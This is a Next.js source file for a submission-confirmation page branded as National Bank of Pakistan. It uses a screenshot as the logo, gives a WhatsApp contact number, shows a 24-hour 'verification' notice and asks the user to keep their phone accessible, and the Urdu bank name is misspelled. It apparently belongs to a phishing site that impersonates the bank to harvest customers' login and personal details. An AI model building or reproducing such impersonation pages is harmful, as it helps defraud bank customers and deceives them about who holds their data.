'use client'

import { useRouter } from 'next/navigation'
import { CheckCheck, ChevronRight, Clock, Home, Info } from 'lucide-react'

const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

const whatsappIcon = 'https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/whatsapp/default.svg'

export default function SuccessPage() {
  const router = useRouter()

  return (
    <main className="login-screen flex min-h-screen flex-col items-center justify-center px-3 py-2 sm:px-4 sm:py-6">
      <div className="w-full max-w-[390px]">
        <section className="rounded-3xl bg-white px-4 py-4 shadow-[0_16px_32px_rgba(0,0,0,0.18)] sm:px-5 sm:py-5">
          <div className="flex flex-col items-center text-center">
            <img
              src={logoImage || '/placeholder.svg'}
              alt="National Bank of Pakistan logo"
              className="h-10 w-auto object-contain sm:h-12"
            />
            <h1 className="mt-4 text-base font-medium text-[#555555]">National Bank of Pakistan</h1>
            <p className="mt-1 text-sm text-[#8a8a8a]" dir="rtl" lang="ur">
              نیشتل بینک آف پاکستان
            </p>
          </div>

          <div className="success-badge-wrap mt-3 flex scale-90 items-center justify-center sm:mt-4 sm:scale-100">
            <span className="success-sparkle success-sparkle-1" aria-hidden="true" />
            <span className="success-sparkle success-sparkle-2" aria-hidden="true" />
            <span className="success-sparkle success-sparkle-3" aria-hidden="true" />
            <span className="success-sparkle success-sparkle-4" aria-hidden="true" />
            <span className="success-sparkle success-sparkle-5" aria-hidden="true" />
            <span className="success-sparkle success-sparkle-6" aria-hidden="true" />
            <div className="success-badge">
              <CheckCheck aria-hidden="true" className="h-10 w-10 text-[#1f8a4c]" strokeWidth={2.5} />
            </div>
          </div>

          <h2 className="mt-2 text-center text-xl font-extrabold text-[#0d5228] sm:text-2xl">Successfully Submitted!</h2>
          <p className="mt-2 text-center text-sm leading-relaxed text-[#8a8a8a]">
            Your information has been received successfully.
          </p>

          <div className="verification-notice mt-3">
            <span className="verification-icon">
              <Clock aria-hidden="true" className="h-5 w-5" />
            </span>
            <div>
              <p className="text-sm font-bold text-[#0d5228]">Verification in Progress</p>
              <p className="mt-1 text-sm leading-relaxed text-[#3f6b52]">
                We are verifying your information. This process may take up to <strong>24 hours</strong>.
              </p>
            </div>
          </div>

          <div className="mt-3 flex items-center gap-3">
            <span className="h-px flex-1 bg-[#e5e5e5]" />
            <span className="text-sm font-semibold text-[#0d5228]">Need Help?</span>
            <span className="h-px flex-1 bg-[#e5e5e5]" />
          </div>

          <a
            href="https://wa.me/923001234567"
            target="_blank"
            rel="noopener noreferrer"
            className="mt-2 flex items-center gap-3 rounded-2xl border border-[#e5e5e5] px-3 py-3 transition-colors hover:bg-[#f7f9f7]"
          >
            <span className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-[#e7f6ec]">
              <img src={whatsappIcon || '/placeholder.svg'} alt="" className="h-6 w-6" />
            </span>
            <span className="flex-1">
              <span className="block text-sm font-bold text-[#1a1a1a]">WhatsApp Us</span>
              <span className="block text-xs text-[#8a8a8a]">For more information and assistance</span>
            </span>
            <span className="text-sm font-semibold text-[#0d5228]">+92 300 1234567</span>
            <ChevronRight aria-hidden="true" className="h-4 w-4 shrink-0 text-[#8a8a8a]" />
          </a>

          <div className="info-notice mt-4">
            <Info aria-hidden="true" className="size-5 shrink-0 text-sky-600" />
            <p>Please keep your phone accessible. We may contact you if any additional information is required.</p>
          </div>

          <button
            type="button"
            onClick={() => router.push('/')}
            className="mt-3 flex h-12 w-full items-center justify-center gap-2 rounded-full bg-gradient-to-r from-[#1f8a4c] to-[#0d5228] text-base font-bold text-white shadow-[0_8px_18px_rgba(16,82,40,0.28)] transition-transform hover:-translate-y-0.5 active:translate-y-0"
          >
            <Home aria-hidden="true" className="h-5 w-5" />
            Back to Login
          </button>
        </section>
      </div>
    </main>
  )
}
